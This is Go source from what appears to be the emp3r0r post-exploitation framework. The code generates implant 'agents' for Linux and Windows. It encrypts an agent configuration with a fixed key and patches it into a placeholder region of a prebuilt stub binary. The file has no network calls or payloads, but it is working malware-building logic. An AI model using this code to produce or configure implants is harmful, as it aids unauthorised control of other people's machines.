package controllers

import (
	"bytes"
	"fmt"
	"os"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// AgentBuildConfig contains parameters for agent generation
type AgentBuildConfig struct {
	PayloadType  string
	Arch         string
	Timestamp    time.Time
	WorkSpace    string
	AgentUUID    string // Provided by operator (generated locally)
	AgentUUIDSig string // Provided by operator (signed by server)
}

// GenerateFilePaths determines stub and output file paths
func GenerateFilePaths(cfg AgentBuildConfig) (stubFile, outFile string) {
	t := cfg.Timestamp
	switch cfg.PayloadType {
	case "linux_executable":
		stubFile = fmt.Sprintf("stub-%s", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	case "windows_executable":
		stubFile = fmt.Sprintf("stub-win-%s", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	case "windows_dll":
		stubFile = fmt.Sprintf("stub-win-%s.dll", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	case "linux_so":
		stubFile = fmt.Sprintf("stub-%s.so", cfg.Arch)
		outFile = fmt.Sprintf("%s/agent_linux_so_%s_%d-%d-%d_%d-%d-%d.so",
			cfg.WorkSpace, cfg.Arch,
			t.Year(), t.Month(), t.Day(), t.Hour(), t.Minute(), t.Second())
	}

	// Set full path for stub
	stubFile = fmt.Sprintf("%s/%s", cfg.WorkSpace, stubFile)
	return
}

// EncryptAgentConfig generates UUID, signs it, marshals config to CBOR, and encrypts
func EncryptAgentConfig(cfg AgentBuildConfig) ([]byte, string, error) {
	configStruct := *live.RuntimeConfig

	// use provided UUID and signature
	configStruct.AgentUUID = cfg.AgentUUID
	configStruct.AgentUUIDSig = cfg.AgentUUIDSig

	// Marshal to CBOR
	cborBytes, err := cbor.Marshal(configStruct)
	if err != nil {
		return nil, "", fmt.Errorf("marshal config to CBOR: %w", err)
	}

	// Encrypt
	encryptedBytes, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), cborBytes)
	if err != nil {
		return nil, "", fmt.Errorf("encrypt config: %w", err)
	}

	return encryptedBytes, configStruct.AgentUUID, nil
}

// PatchAgentBinary reads stub, patches with config, writes output
func PatchAgentBinary(stubFile, outFile string, configPayload []byte) error {
	// Read stub
	toWrite, err := os.ReadFile(stubFile)
	if err != nil {
		return fmt.Errorf("read stub: %w", err)
	}

	// Pad config payload to 4096 bytes
	if len(configPayload) < len(def.AgentConfig) {
		configPayload = append(configPayload, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(configPayload))...)
	} else if len(configPayload) > len(def.AgentConfig) {
		return fmt.Errorf("config payload too large: %d bytes (max %d)", len(configPayload), len(def.AgentConfig))
	}

	// Replace placeholder with config
	toWrite = bytes.Replace(toWrite,
		bytes.Repeat([]byte{0xff}, len(configPayload)),
		configPayload,
		1)

	// Write output
	if err := os.WriteFile(outFile, toWrite, 0o755); err != nil {
		return fmt.Errorf("write agent binary: %w", err)
	}

	return nil
}

// BuildAgentResult contains the results of agent building
type BuildAgentResult struct {
	StubFile   string
	OutputFile string
	AgentUUID  string
	ConfigSize int
}

// BuildAgent performs the complete agent generation workflow
// This is the main entry point for agent generation business logic
func BuildAgent(cfg AgentBuildConfig, runtimeConfig *def.Config) (*BuildAgentResult, error) {
	// 1. Generate file paths
	stubFile, outFile := GenerateFilePaths(cfg)

	// 2. Check stub exists
	if !util.IsExist(stubFile) {
		return nil, fmt.Errorf("stub file not found: %s", stubFile)
	}

	// 3. Encrypt agent config
	configPayload, agentUUID, err := EncryptAgentConfig(cfg)
	if err != nil {
		return nil, fmt.Errorf("encrypt config: %w", err)
	}

	// 4. Patch binary
	if err := PatchAgentBinary(stubFile, outFile, configPayload); err != nil {
		return nil, fmt.Errorf("patch binary: %w", err)
	}

	return &BuildAgentResult{
		StubFile:   stubFile,
		OutputFile: outFile,
		AgentUUID:  agentUUID,
		ConfigSize: len(configPayload),
	}, nil
}
